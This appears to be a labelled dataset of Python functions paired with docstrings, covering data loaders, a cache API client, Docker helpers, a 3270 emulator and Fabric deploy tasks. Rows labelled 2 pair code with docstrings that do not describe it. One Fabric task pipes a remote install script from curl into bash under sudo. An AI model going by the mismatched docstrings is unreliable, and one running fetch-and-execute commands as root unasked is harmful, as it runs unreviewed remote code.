1	def readNums(file_handle, num_type, count): num_bytes = count * numpy.dtype(num_type).itemsize string = file_handle.read(num_bytes) return numpy.fromstring(string, dtype = num_type)	Reads 4 bytes from file, returns it as a 32-bit integer.
1	def readHeader(file_handle, debug=False, from_gzip=None): if from_gzip is None: from_gzip = isinstance(file_handle, (gzip.GzipFile, bz2.BZ2File)) key_to_type = { 0x1E3D4C51 : ('float32', 4),0x1E3D4C53 : ('float64', 8), 0x1E3D4C54 : ('int32', 4), 0x1E3D4C55 : ('uint8', 1), 0x1E3D4C56 : ('int16', 2) } type_key = readNums(file_handle, 'int32', 1)[0] elem_type, elem_size = key_to_type[type_key] if debug: print "header's type key, type, type size: ", \ type_key, elem_type, elem_size if elem_type == 'packed matrix': raise NotImplementedError('packed matrix not supported') num_dims = readNums(file_handle, 'int32', 1)[0] if debug: print '# of dimensions, according to header: ', num_dims if from_gzip: shape = readNums(file_handle, 'int32', max(num_dims, 3))[:num_dims] else: shape = numpy.fromfile(file_handle, dtype='int32', count=max(num_dims, 3))[:num_dims] if debug: print 'Tensor shape, as listed in header:', shape return elem_type, elem_size, shape	:param file_handle: an open file handle. :type file_handle: a file or gzip.GzipFile object :param from_gzip: bool or None :type from_gzip: if None determine the type of file handle. :returns: data type, element size, rank, shape, size
1	def parseNORBFile(file_handle, subtensor=None, debug=False): elem_type, elem_size, shape = readHeader(file_handle,debug) beginning = file_handle.tell() num_elems = numpy.prod(shape) result = None if isinstance(file_handle, (gzip.GzipFile, bz2.BZ2File)): assert subtensor is None, \ "Subtensors on gzip files are not implemented." result = readNums(file_handle, elem_type, num_elems*elem_size).reshape(shape) elif subtensor is None: result = numpy.fromfile(file_handle, dtype = elem_type, count = num_elems).reshape(shape) elif isinstance(subtensor, slice): if subtensor.step not in (None, 1): raise NotImplementedError('slice with step', subtensor.step) if subtensor.start not in (None, 0): bytes_per_row = numpy.prod(shape[1:]) * elem_size file_handle.seek(beginning+subtensor.start * bytes_per_row) shape[0] = min(shape[0], subtensor.stop) - subtensor.start result = numpy.fromfile(file_handle, dtype=elem_type, count=num_elems).reshape(shape) else: raise NotImplementedError('subtensor access not written yet:', subtensor) return result	Load all or part of file 'f' into a numpy ndarray :param file_handle: file from which to read file can be opended with open(), gzip.open() and bz2.BZ2File() @type f: file-like object. Can be a gzip open file. :param subtensor: If subtensor is not None, it should be like the argument to numpy.ndarray.__getitem__. The following two expressions should return equivalent ndarray objects, but the one on the left may be faster and more memory efficient if the underlying file f is big. read(f, subtensor) <===> read(f)[*subtensor] Support for subtensors is currently spotty, so check the code to see if your particular type of subtensor is supported.
1	def _loadBlocks(): blocksPath = os.path.join(os.path.dirname(__file__), 'Blocks.txt') endpoints = [] names = [] splitter = re.compile(r'^(....)\.\.(....); (.*)$') for line in open(blocksPath): if line.startswith('#'): continue line = line.strip() if not line: continue m = splitter.match(line) assert m start = int(m.group(1), 16) end = int(m.group(2), 16) name = m.group(3) endpoints.append(start) endpoints.append(end) names.append(name) names.append(name) return endpoints, names _endpoints, _names = _loadBlocks()	Load Blocks.txt. Create and return two parallel lists. One has the start and end points for codepoint ranges, the second has the corresponding block name.
1	def unicodeBlock(c): ix = bisect_left(_endpoints, ord(c)) return _names[ix]	Returns the name of the unicode block containing c c must be a single character.
1	def guessLanguage(text): if not text: return UNKNOWN if isinstance(text, str): text = unicode(text, 'utf-8') text = normalize(text) return _identify(text, find_runs(text))	Returns the language code, i.e. 'en'
1	def guessLanguageInfo(text): tag = guessLanguage(text) if tag == UNKNOWN: return UNKNOWN, UNKNOWN, UNKNOWN id = _getId(tag) name = _getName(tag) return tag, id, name	Returns (tag, id, name) i.e. ('en', 26110, 'english')
1	def guessLanguageId(text): lang = guessLanguage(text) return _getId(lang)	Returns the language id. i.e. 26110
1	def guessLanguageName(text): lang = guessLanguage(text) return _getName(lang)	Returns the language name. i.e. 'english'
1	def find_runs(text): run_types = defaultdict(int) totalCount = 0 for c in text: if c.isalpha(): block = unicodeBlock(c) run_types[block] += 1 totalCount += 1 relevant_runs = [] for key, value in run_types.items(): pct = (value * 100) / totalCount if pct >= 40: relevant_runs.append(key) elif key == "Basic Latin" and (pct >= 1): relevant_runs.append(key) elif key == "Latin Extended Additional" and (pct >= 1): relevant_runs.append(key) return relevant_runs	Count the number of characters in each character block
1	def createOrderedModel(content): trigrams = defaultdict(int) content = content.lower() for i in xrange(0, len(content) - 2): trigrams[content[i:i + 3]] += 1 return sorted(trigrams.keys(), key=lambda k: (-trigrams[k], k))	Create a list of trigrams in content sorted by frequency
1	def normalize(u): if not sys.version.startswith('2.6.6'): u = unicodedata.normalize('NFC', u) u = nonAlphaRe.sub(' ', u) u = spaceRe.sub(' ', u) return u	Convert to normalized unicode. Remove non-alpha chars and compress runs of spaces.
1	def buffered_gen_threaded(source_gen, buffer_size=2): if buffer_size < 2: raise RuntimeError("Minimal buffer size is 2!") buffer = Queue.Queue(maxsize=buffer_size - 1) def _buffered_generation_thread(source_gen, buffer): for data in source_gen: buffer.put(data, block=True) buffer.put(None) thread = threading.Thread(target=_buffered_generation_thread, args=(source_gen, buffer)) thread.daemon = True thread.start() for data in iter(buffer.get, None): yield data	Generator that runs a slow source generator in a separate thread. Beware of the GIL! buffer_size: the maximal number of items to pre-generate (length of the buffer)
1	def log_loss(y, t, eps=1e-15): y = T.clip(y, eps, 1 - eps) loss = -T.sum(t * T.log(y)) / y.shape[0].astype(theano.config.floatX) return loss	cross entropy loss, summed over classes, mean over batches
1	def __init__(self, name=None, **kwargs): if name is not None: self.name = name self.client = iron_core.IronClient(name=IronCache.NAME, version=IronCache.VERSION, product="iron_cache", **kwargs)	Prepare a configured instance of the API wrapper and return it. Keyword arguments are passed directly to iron_core_python; consult its documentation for a full list and possible values.
1	def caches(self, options={}): query = urllib.urlencode(options) url = "caches" if query != "": url = "%s?%s" % (url, query) result = self.client.get(url) return [cache["name"] for cache in result["body"]]	Query the server for a list of caches, parse the JSON response, and return the result. Keyword arguments: options -- a dict of arguments to send with the request. See http://dev.iron.io/cache/reference/api/#list_caches for more information on defaults and possible values.
1	def get(self, key, cache=None): if cache is None: cache = self.name if cache is None: raise ValueError("Cache name must be set") cache = quote_plus(cache) key = quote_plus(key) url = "caches/%s/items/%s" % (cache, key) result = self.client.get(url) return Item(values=result["body"])	Query the server for an item, parse the JSON, and return the result. Keyword arguments: key -- the key of the item that you'd like to retrieve. Required. cache -- the name of the cache that the item resides in. Defaults to None, which uses self.name. If no name is set, raises a ValueError.
1	def put(self, key, value, cache=None, options={}): if cache is None: cache = self.name if cache is None: raise ValueError("Cache name must be set") if not isinstance(value, str_type) and not isinstance(value, int_types): value = json.dumps(value) options["value"] = value body = json.dumps(options) cache = quote_plus(cache) key = quote_plus(key) result = self.client.put("caches/%s/items/%s" % (cache, key), body, {"Content-Type": "application/json"}) return Item(cache=cache, key=key, value=value)	Query the server to set the key specified to the value specified in the specified cache. Keyword arguments: key -- the name of the key to be set. Required. value -- the value to set key to. Must be a string or JSON serialisable. Required. cache -- the cache to store the item in. Defaults to None, which uses self.name. If no name is set, raises a ValueError. options -- a dict of arguments to send with the request. See http://dev.iron.io/cache/reference/api/#put_item for more information on defaults and possible values.
1	def delete(self, key, cache=None): if cache is None: cache = self.name if cache is None: raise ValueError("Cache name must be set") cache = quote_plus(cache) key = quote_plus(key) self.client.delete("caches/%s/items/%s" % (cache, key)) return True	Query the server to delete the key specified from the cache specified. Keyword arguments: key -- the key the item is stored under. Required. cache -- the cache to delete the item from. Defaults to None, which uses self.name. If no name is set, raises a ValueError.
1	def increment(self, key, cache=None, amount=1): if cache is None: cache = self.name if cache is None: raise ValueError("Cache name must be set") cache = quote_plus(cache) key = quote_plus(key) body = json.dumps({"amount": amount}) result = self.client.post("caches/%s/items/%s/increment" % (cache, key), body, {"Content-Type": "application/json"}) result = result["body"] return Item(values=result, cache=cache, key=key)	Query the server to increment the value of the key by the specified amount. Negative amounts can be used to decrement. Keyword arguments: key -- the key the item is stored under. Required. cache -- the cache the item belongs to. Defaults to None, which uses self.name. If no name is set, raises a ValueError. amount -- the amount to increment the value by. Can be negative to decrement the value. Defaults to 1.
1	def decrement(self, key, cache=None, amount=1): amount = amount * -1 return self.increment(key=key, cache=cache, amount=amount)	A convenience function for passing negative values to increment. Keyword arguments: key -- the key the item is stored under. Required. cache -- the cache the item belongs to. Defaults to None, which uses self.name. If no name is set, raises a ValueError. amount -- the amount to decrement the value by. Can be negative to increment the value. Defaults to 1.
1	class BrowseAPIPanel(DebugPanel): name = 'DebugAPI' has_content = True def __init__(self, jinja_env, context={}): DebugPanel.__init__(self, jinja_env, context=context) self.jinja_env.loader = jinja2.ChoiceLoader([ self.jinja_env.loader, template_loader]) self.variables = {} def nav_title(self): return 'API Browse' def title(self): return 'API Browse' def url(self): return '' def nav_subtitle(self): count = len(self.routes) return '%s %s' % (count, 'route' if count == 1 else 'routes') def process_request(self, request): rs = current_app.url_map.iter_rules() self.routes = [r for r in rs if r.rule.startswith(_prefix())] for r in self.routes: self.variables[r.rule] = self.url_builder(r) def content(self): return self.render('debug-api/routes.html', { 'routes': self.routes, 'prefix': _prefix(), 'url_for': url_for, 'variables': self.variables }) def url_builder(self, route): parts = [] for (converter, arguments, variable) in parse_rule(route.rule): parts.append({'variable': converter is not None, 'text': variable}) content = self.render('debug-api/url-builder.html', { 'route': route, 'parts': parts, 'url_for': url_for }) return Markup(content)	Panel that displays the API browser
1	class BaseCommand(Command): user_options = [] def initialize_options(self): pass def finalize_options(self): pass def get_inputs(self): return [] def get_outputs(self): return [] class Bower(BaseCommand):	Dumb empty command because Command needs subclasses to override too much
1	def _configure_byor(self): if not self.byor_is_used: self._reset_byor() return byor_ip = self.user_options['byor_docker_ip'] byor_port = self.user_options['byor_docker_port'] try: self._byor_client = docker.Client('{}:{}'.format(byor_ip, byor_port), version='auto', timeout=self.byor_timeout) except DockerException as e: self._is_failed = True message = str(e) if 'ConnectTimeoutError' in message: log_message = 'Connection to the Docker daemon took too long (> {} secs)'.format( self.byor_timeout ) notification_message = 'BYOR timeout limit {} exceeded'.format(self.byor_timeout) else: log_message = "Failed to establish connection with the Docker daemon" notification_message = log_message self._add_to_log(log_message, level=2) yield self.notify_about_fail(notification_message) self._is_building = False raise self.container_ip = byor_ip	Configure BYOR settings or reset them if BYOR is not needed.
1	def should_run(self): css_targets = [pjoin(static, 'css', 'style.min.css')] css_maps = [t + '.map' for t in css_targets] targets = css_targets + css_maps if not all(os.path.exists(t) for t in targets): return True earliest_target = sorted(mtime(t) for t in targets)[0] for (dirpath, dirnames, filenames) in os.walk(static): for f in filenames: if f.endswith('.less'): path = pjoin(static, dirpath, f) timestamp = mtime(path) if timestamp > earliest_target: return True return False	Does less need to run?
1	def executor(self): cls = self.__class__ if cls._executor is None: cls._executor = ThreadPoolExecutor(20) return cls._executor	single global executor
1	def form_repo_url(self): return self.user_options.get('repo_url', '')	Repository URL as submitted by the user.
1	def stop(self, now=False): self._is_empty = True self.log.info( "Stopping container %s (id: %s)", self.container_name, self.container_id[:7]) try: yield self.docker('stop', self.container_id) except APIError as e: message = str(e) self.log.warn("Can't stop the container: %s" % message) if 'container destroyed' not in message: raise else: if self.remove_containers: self.log.info( "Removing container %s (id: %s)", self.container_name, self.container_id[:7]) yield self.docker('remove_container', self.container_id, v=True) self.clear_state()	Stop the container Consider using pause/unpause when docker-py adds support
1	def _docker(self, method, *args, **kwargs): generator_methods = ('build',) m = getattr(self.client, method) if method in generator_methods: def lister(mm): ret = [] for l in mm: for lj in l.decode().split('\r\n'): if len(lj) > 0: ret.append(lj) try: j = json.loads(lj) except json.JSONDecodeError as e: self.log.warn("Error decoding string to json: %s" % lj) else: if 'stream' in j and not j['stream'].startswith(' --->'): self._cur_waiter.add_to_log(j['stream'], 2) return ret return lister(m(*args, **kwargs)) else: return m(*args, **kwargs)	wrapper for calling docker methods to be passed to ThreadPoolExecutor
1	def lookup_node_name(self): containers = yield self.docker('containers', all=True) for container in containers: if container['Id'] == self.container_id: name, = container['Names'] node, container_name = name.lstrip("/").split("/") raise gen.Return(node)	Find the name of the swarm node that the container is running on.
1	class Emulator(EmulatorBase): x3270_executable = '/usr/bin/x3270' s3270_executable = '/usr/bin/s3270' class Navigator:	Represents a virtual 3270 terminal and its operations. Create an Emulator with: :param visible: Defines if the virtual 3270 terminal must be visible or run in background. :type visible: Boolean .. IMPORTANT:: It needs x3270 and s3270 command line tools installed to work.
1	def set_text(self, text): self.text = text self.length = len(text) self.data = text.replace(self.filler," ").rstrip() return self.data	Sets the text of the field and the filtered data (text without filler characters) :param text: raw text of field :type text: string
1	class Field: def __init__(self, start_of_field, row=None, col=None, text="", filler="_"): self.filler = filler self.start_of_field = self._SF(start_of_field) self.row = row self.col = col self.set_text(text) self.is_visible = ("c0=cd" not in start_of_field) self.is_editable = False for sf in self.start_of_field: self.is_editable = self.is_editable or sf in ("c0=c1","c0=cd") def set_text(self, text): """Sets the text of the field and the filtered data (text without filler characters) :param text: raw text of field :type text: string """ self.text = text self.length = len(text) self.data = text.replace(self.filler," ").rstrip() return self.data def _SF(self, char): return char[3:-1].split(',')	It's a representation of a 3270 field, with a *start of field* sequence, its position (*row* and *column*), raw *text* and its ASCII *data* representation :param start_of_field: a 3270 SF sequence :param row: starting row of the field :param col: starting column of the field :param text: raw text of the field :param filler: ASCII character used to fill empty editable field :type start_of_field: string :type row: int :type col: int :type text: string :type filler: string
1	def load(self, config, emulator_mock): if config.has_section(self.name): self.hex = json.loads(config.get(self.name, 'hex')) self.ascii = json.loads(config.get(self.name, 'ascii')) self.status = json.loads(config.get(self.name, 'status')) else: raise Exception('Screen "%s" not found.' % self.name) emulator_mock.should_receive('exec_command').with_args('Ascii').and_return(self.ascii) emulator_mock.should_receive('exec_command').with_args('ReadBuffer(Ascii)').and_return(self.hex) emulator_mock.status = self.status return emulator_mock	Loads screen from file :param config: screens config file as a configuration parser :param emulator_mock: Saul Tigh 3270 Emulator mock used to retrieve a screen from it :type config: SafeConfigParser :type emulator_mock: flexmock(Emulator) :return: modified emulator_mock prepared to return screen, buffer and status
1	def store(self, config, emulator): self.ascii = emulator.exec_command('Ascii').data self.hex = emulator.exec_command('ReadBuffer(Ascii)').data self.status = emulator.status.__dict__ if not config.has_section(self.name): config.add_section(self.name) config.set(self.name, 'hex', json.dumps(self.hex)) config.set(self.name, 'ascii', json.dumps(self.ascii)) config.set(self.name, 'status', json.dumps(self.status)) with open(config.filename, 'wb') as configfile: config.write(configfile) return self	Stores a screen to a file :param config: configuration to store screen to :param emulator: Saul Tigh 3270 Emulator used to retrieve a screen from it :type emulator: Emulator :type config: SafeConfigParser
1	plugin_identifier = "m33fio"	Do not forget to adjust the following variables to your own plugin.
1	period=None, verbose=False): self.database = database self.user = user self.password = password self.host = host self.port = port self.table = table self.tsid_list = tsid_list self.period = period self.verbose = verbose self.source_weights_df = query_source_weights( database=self.database, user=self.user, password=self.password, host=self.host, port=self.port) self.source_exclude_list = ['pySecMaster_Consensus'] self.source_id_exclude_list = [] for source in self.source_exclude_list: source_id = query_data_vendor_id( database=self.database, user=self.user, password=self.password, host=self.host, port=self.port, name=source) self.source_id_exclude_list.append(source_id) if self.verbose: if self.period: print('Running cross validator for %s tsids only for the prior ' '%i day\'s history.' % (len(tsid_list), self.period)) else: print('Running cross validator for %s tsids for the entire ' 'data history.' % (len(tsid_list),)) self.main()	:param database: String of the database name :param user: String of the username used to login to the database :param password: String of the password used to login to the database :param host: String of the database address (localhost, url, ip, etc.) :param port: Integer of the database port number (5432) :param table: String of the database table that should be worked on :param tsid_list: List of strings, with each string being a tsid :param period: Optional integer indicating the number of days whose values should be cross validated. If None is provided, then the entire set of values will be validated. :param verbose: Boolean of whether to print debugging statements or not
1	def main(self): validator_start = time.time() """No multiprocessing""" """Multiprocessing using 4 threads""" multithread(self.validator, self.tsid_list, threads=5) if self.verbose: print('%i tsids have had their sources cross validated taking ' '%0.2f seconds.' % (len(self.tsid_list), time.time() - validator_start))	Start the tsid cross validator process using either single or multiprocessing.
2	def send(self, strg): if self.debuglevel > 0: print('send:', repr(strg[:300]), file=sys.stderr) if hasattr(self, 'sock') and self.sock: try: if self.transferSize: lock=threading.Lock() lock.acquire() self.transferSize = len(strg) lock.release() for i in range(0, self.transferSize, chunksize): if isinstance(strg, bytes): self.sock.send((strg[i:i+chunksize])) else: self.sock.send((strg[i:i + chunksize]).encode('utf-8')) lock.acquire() self.progress = i lock.release() else: self.sock.sendall(strg.encode('utf-8')) except socket.error: self.close() raise smtplib.SMTPServerDisconnected('Server not connected') else: raise smtplib.SMTPServerDisconnected('please run connect() first')	Process the arguments and control the flow of the program.
1	class ReverseProxied(object): def __init__(self, application): self.app = application def __call__(self, environ, start_response): script_name = environ.get('HTTP_X_SCRIPT_NAME', '') if script_name: environ['SCRIPT_NAME'] = script_name path_info = environ.get('PATH_INFO', '') if path_info and path_info.startswith(script_name): environ['PATH_INFO'] = path_info[len(script_name):] scheme = environ.get('HTTP_X_SCHEME', '') if scheme: environ['wsgi.url_scheme'] = scheme servr = environ.get('HTTP_X_FORWARDED_SERVER', '') if servr: environ['HTTP_HOST'] = servr return self.app(environ, start_response)	Wrap the application in this middleware and configure the front-end server to add these headers, to let you quietly bind this to a URL other than / and to an HTTP scheme that is different than what is used locally. Code courtesy of: http://flask.pocoo.org/snippets/35/ In nginx: location /myprefix { proxy_pass http://127.0.0.1:8083; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Scheme $scheme; proxy_set_header X-Script-Name /myprefix; }
1	def Instance(self): try: return self._instance except AttributeError: self._instance = self._decorated() return self._instance	Returns the singleton instance. Upon its first call, it creates a new instance of the decorated class and calls its `__init__` method. On all subsequent calls, the already created instance is returned.
1	class Singleton: def __init__(self, decorated): self._decorated = decorated def Instance(self): """ Returns the singleton instance. Upon its first call, it creates a new instance of the decorated class and calls its `__init__` method. On all subsequent calls, the already created instance is returned. """ try: return self._instance except AttributeError: self._instance = self._decorated() return self._instance def __call__(self): raise TypeError('Singletons must be accessed through `Instance()`.') def __instancecheck__(self, inst): return isinstance(inst, self._decorated) @Singleton class Gauth:	A non-thread-safe helper class to ease implementing singletons. This should be used as a decorator -- not a metaclass -- to the class that should be a singleton. The decorated class can define one `__init__` function that takes only the `self` argument. Also, the decorated class cannot be inherited from. Other than that, there are no restrictions that apply to the decorated class. To get the singleton instance, use the `Instance` method. Trying to use `__call__` will result in a `TypeError` being raised.
1	def init_cache_busting(app): static_folder = os.path.join(app.static_folder, '') hash_table = {} app.logger.debug('Computing cache-busting values...') for dirpath, __, filenames in os.walk(static_folder): for filename in filenames: rooted_filename = os.path.join(dirpath, filename) with open(rooted_filename, 'rb') as f: file_hash = hashlib.md5(f.read()).hexdigest()[:7] file_path = rooted_filename.replace(static_folder, "") file_path = file_path.replace("\\", "/") hash_table[file_path] = file_hash app.logger.debug('Finished computing cache-busting values') def bust_filename(filename): return hash_table.get(filename, "") def unbust_filename(filename): return filename.split("?", 1)[0] @app.url_defaults def reverse_to_cache_busted_url(endpoint, values): """ Make `url_for` produce busted filenames when using the 'static' endpoint. """ if endpoint == "static": file_hash = bust_filename(values["filename"]) if file_hash: values["q"] = file_hash def debusting_static_view(filename): """ Serve a request for a static file having a busted name. """ return original_static_view(filename=unbust_filename(filename)) original_static_view = app.view_functions["static"] app.view_functions["static"] = debusting_static_view	Configure `app` to so that `url_for` adds a unique query string to URLs generated for the `'static'` endpoint. This allows setting long cache expiration values on static resources because whenever the resource changes, so does its URL.
1	channel_token=None, expiration=None): body = { 'id': channel_id, 'type': channel_type, 'address': channel_address } if channel_token: body['token'] = channel_token if expiration: body['expiration'] = expiration return drive.auth.service.files().watch(fileId=file_id, body=body).execute()	Watch for any changes to a specific file. Args: service: Drive API service instance. file_id: ID of the file to watch. channel_id: Unique string that identifies this channel. channel_type: Type of delivery mechanism used for this channel. channel_address: Address where notifications are delivered. channel_token: An arbitrary string delivered to the target address with each notification delivered over this channel. Optional. channel_address: Address where notifications are delivered. Optional. Returns: The created channel if successful Raises: apiclient.errors.HttpError: if http request to create channel fails.
1	def stopChannel(drive, channel_id, resource_id): body = { 'id': channel_id, 'resourceId': resource_id } return drive.auth.service.channels().stop(body=body).execute()	Stop watching to a specific channel. Args: service: Drive API service instance. channel_id: ID of the channel to stop. resource_id: Resource ID of the channel to stop. Raises: apiclient.errors.HttpError: if http request to create channel fails.
2	def send_mail(book_id, book_format, convert, kindle_mail, calibrepath, user_id): book = db.session.query(db.Books).filter(db.Books.id == book_id).first() if convert: return convert_book_format(book_id, calibrepath, u'epub', book_format.lower(), user_id, kindle_mail) else: for entry in iter(book.data): if entry.format.upper() == book_format.upper(): result = entry.name + '.' + book_format.lower() global_WorkerThread.add_email(_(u"Send to Kindle"), book.path, result, ub.get_mail_settings(), kindle_mail, user_id, _(u"E-mail: %(book)s", book=book.title), _(u'This e-mail has been sent via Calibre-Web.')) return return _(u"The requested file could not be read. Maybe wrong permissions?")	copy the contents of query file to the output file, excludind all ids that match the excluded list.\n Returns a list with all selected al ids.
1	def get_valid_filename(value, replace_whitespace=True): if value[-1:] == u'.': value = value[:-1]+u'_' value = value.replace("/", "_").replace(":", "_").strip('\0') if use_unidecode: value = (unidecode.unidecode(value)).strip() else: value = value.replace(u'', u'SS') value = value.replace(u'', u'ss') value = unicodedata.normalize('NFKD', value) re_slugify = re.compile('[\W\s-]', re.UNICODE) if isinstance(value, str): # Python3 str, Python2 unicode value = re_slugify.sub('', value).strip() else: value = unicode(re_slugify.sub('', value).strip()) if replace_whitespace: value = re.sub(r'[\*\+:\\\"/<>\?]+', u'_', value, flags=re.U) value = re.sub(r'[\|]+', u',', value, flags=re.U) value = value[:128] if not value: raise ValueError("Filename cannot be empty") if sys.version_info.major == 3: return value else: return value.decode('utf-8')	Returns the given string converted to a string that can be used for a clean filename. Limits num characters to 128 max.
1	def applyToAllFilesInFolder(folder, fileexts, func, *params): def visit ( arg, dirname, names ): for name in names: shortName, ext = os.path.splitext(name) if ext.lower() in fileexts: func(os.path.join(dirname, name), *params) os.path.walk(folder, visit, 0)	apply function with params func to all files with extenstions from list fileext in folder example: applyToAllFilesInFolder ("C:", [".txt"], lambda filename:None)
1	def _get_tree_paths(tree, node_id, depth=0): if node_id == _tree.TREE_LEAF: raise ValueError("Invalid node_id %s" % _tree.TREE_LEAF) left_child = tree.children_left[node_id] right_child = tree.children_right[node_id] if left_child != _tree.TREE_LEAF: left_paths = _get_tree_paths(tree, left_child, depth=depth + 1) right_paths = _get_tree_paths(tree, right_child, depth=depth + 1) for path in left_paths: path.append(node_id) for path in right_paths: path.append(node_id) paths = left_paths + right_paths else: paths = [[node_id]] return paths	Returns all paths through the tree as list of node_ids
1	def _predict_tree(model, X, joint_contribution=False): leaves = model.apply(X) paths = _get_tree_paths(model.tree_, 0) for path in paths: path.reverse() leaf_to_path = {} for path in paths: leaf_to_path[path[-1]] = path values = model.tree_.value.squeeze(axis=1) if len(values.shape) == 0: values = np.array([values]) if isinstance(model, DecisionTreeRegressor): biases = np.full(X.shape[0], values[paths[0][0]]) line_shape = X.shape[1] elif isinstance(model, DecisionTreeClassifier): normalizer = values.sum(axis=1)[:, np.newaxis] normalizer[normalizer == 0.0] = 1.0 values /= normalizer biases = np.tile(values[paths[0][0]], (X.shape[0], 1)) line_shape = (X.shape[1], model.n_classes_) direct_prediction = values[leaves] values_list = list(values) feature_index = list(model.tree_.feature) contributions = [] if joint_contribution: for row, leaf in enumerate(leaves): path = leaf_to_path[leaf] path_features = set() contributions.append({}) for i in range(len(path) - 1): path_features.add(feature_index[path[i]]) contrib = values_list[path[i+1]] - \ values_list[path[i]] contributions[row][tuple(sorted(path_features))] = \ contributions[row].get(tuple(sorted(path_features)), 0) + contrib return direct_prediction, biases, contributions else: unique_leaves = np.unique(leaves) unique_contributions = {} for row, leaf in enumerate(unique_leaves): for path in paths: if leaf == path[-1]: break contribs = np.zeros(line_shape) for i in range(len(path) - 1): contrib = values_list[path[i+1]] - \ values_list[path[i]] contribs[feature_index[path[i]]] += contrib unique_contributions[leaf] = contribs for row, leaf in enumerate(leaves): contributions.append(unique_contributions[leaf]) return direct_prediction, biases, np.array(contributions)	For a given DecisionTreeRegressor, DecisionTreeClassifier, ExtraTreeRegressor, or ExtraTreeClassifier, returns a triple of [prediction, bias and feature_contributions], such that prediction bias + feature_contributions.
1	def _predict_forest(model, X, joint_contribution=False): biases = [] contributions = [] predictions = [] if joint_contribution: for tree in model.estimators_: pred, bias, contribution = _predict_tree(tree, X, joint_contribution=joint_contribution) biases.append(bias) contributions.append(contribution) predictions.append(pred) total_contributions = [] for i in range(len(X)): contr = {} for j, dct in enumerate(contributions): for k in set(dct[i]).union(set(contr.keys())): contr[k] = (contr.get(k, 0)*j + dct[i].get(k,0) ) / (j+1) total_contributions.append(contr) for i, item in enumerate(contribution): total_contributions[i] sm = sum([v for v in contribution[i].values()]) return (np.mean(predictions, axis=0), np.mean(biases, axis=0), total_contributions) else: for tree in model.estimators_: pred, bias, contribution = _predict_tree(tree, X) biases.append(bias) contributions.append(contribution) predictions.append(pred) return (np.mean(predictions, axis=0), np.mean(biases, axis=0), np.mean(contributions, axis=0))	For a given RandomForestRegressor, RandomForestClassifier, ExtraTreesRegressor, or ExtraTreesClassifier returns a triple of [prediction, bias and feature_contributions], such that prediction bias + feature_contributions.
1	def predict(model, X, joint_contribution=False): if model.n_outputs_ > 1: raise ValueError("Multilabel classification trees not supported") if (isinstance(model, DecisionTreeClassifier) or isinstance(model, DecisionTreeRegressor)): return _predict_tree(model, X, joint_contribution=joint_contribution) elif (isinstance(model, ForestClassifier) or isinstance(model, ForestRegressor)): return _predict_forest(model, X, joint_contribution=joint_contribution) else: raise ValueError("Wrong model type. Base learner needs to be a " "DecisionTreeClassifier or DecisionTreeRegressor.")	Returns a triple (prediction, bias, feature_contributions), such that prediction bias + feature_contributions. Parameters ---------- model : DecisionTreeRegressor, DecisionTreeClassifier, ExtraTreeRegressor, ExtraTreeClassifier, RandomForestRegressor, RandomForestClassifier, ExtraTreesRegressor, ExtraTreesClassifier Scikit-learn model on which the prediction should be decomposed. X : array-like, shape = (n_samples, n_features) Test samples. joint_contribution : boolean Specifies if contributions are given individually from each feature, or jointly over them Returns ------- decomposed prediction : triple of * prediction, shape = (n_samples) for regression and (n_samples, n_classes) for classification * bias, shape = (n_samples) for regression and (n_samples, n_classes) for classification * contributions, If joint_contribution is False then returns and array of shape = (n_samples, n_features) for regression or shape = (n_samples, n_features, n_classes) for classification, denoting contribution from each feature. If joint_contribution is True, then shape is array of size n_samples, where each array element is a dict from a tuple of feature indices to to a value denoting the contribution from that feature tuple.
1	def stdout(self): return self.output	Alias for output attribute, to match stderr
1	class CalledProcessError(Exception): def __init__(self, returncode, cmd, output=None, stderr=None): self.returncode = returncode self.cmd = cmd self.output = output self.stderr = stderr def __str__(self): return "Command '%s' returned non-zero exit status %d" % (self.cmd, self.returncode) def stdout(self): """Alias for output attribute, to match stderr""" return self.output def stdout(self, value): self.output = value def is_64bit():	This exception is raised by subprocess_handler() returns a non-zero exit status. It is a direct copy + paste backport from Python 3, as the Python 2 version does not include the "stderr" property. Original docstring: This exception is raised when a process run by check_call() or check_output() returns a non-zero exit status. The exit status will be stored in the returncode attribute; check_output() will also store the output in the output attribute.
2	def alertthemedia(): local("curl -I http://databank-soundsystem.latimes.com/rollout/")	Creates a temporary query fasta file from fasta_file seqs, return the list of query ids.
1	def bigfiles(min_size='20000k'): cmd = """find ./ -type f -size +%s -exec ls -lh {} \; | \ awk '{ print $NF ": " $5 }'""" with hide('everything'): list_ = local(cmd % min_size) if list_: print("Files over %s" % min_size) print(list_) else: print("No files over %s" % min_size)	List all files in the current directory over the provided size, which 20MB by default. Example usage: $ fab bigfiles
1	def clean(): env.shell = "/bin/bash -c" with cd(env.project_dir): sudo("find . -name '*.pyc' -print0|xargs -0 rm", pty=True)	Erases pyc files from our app code directory.
1	def collectstatic(): _venv("rm -rf ./static") _venv("python manage.py collectstatic --noinput")	Roll out the latest static files
1	def cook(): sudo('mkdir -p /etc/chef') sudo('chown ubuntu -R /etc/chef') rsync_project("/etc/chef/", "./chef/") sudo('cd /etc/chef && %s' % env.chef, pty=True)	Update Chef cookbook and execute it.
1	): print("Warming up...") conn = boto.ec2.connect_to_region( region, aws_access_key_id=env.AWS_ACCESS_KEY_ID, aws_secret_access_key=env.AWS_SECRET_ACCESS_KEY, ) print("Reserving an instance...") reservation = conn.run_instances( ami, key_name=key_name, instance_type=instance_type, ) instance = reservation.instances[0] print('Waiting for instance to start...') status = instance.update() while status == 'pending': time.sleep(10) status = instance.update() if status == 'running': print('New instance %s' % instance.id) print('Accessible at %s' % instance.public_dns_name) else: print('Instance status: ' + status) return (instance.id, instance.public_dns_name)	Spin up a new server on Amazon EC2. Returns the id and public address. By default, we use Ubuntu 12.04 LTS
1	def deploy(): pull() restartapache()	Deploy the latest code and restart everything.
1	def hampsterdance(): local("curl -I http://databank-soundsystem.latimes.com/hampster-dance/")	The soundtrack of the Internet that once was.
1	def installchef(): sudo('apt-get update', pty=True) sudo('apt-get install -y git-core', pty=True) sudo('curl -L https://www.opscode.com/chef/install.sh | bash', pty=True) sudo('ln -s /opt/chef/bin/chef-solo /usr/local/bin/chef-solo')	Install all the dependencies to run a Chef cookbook
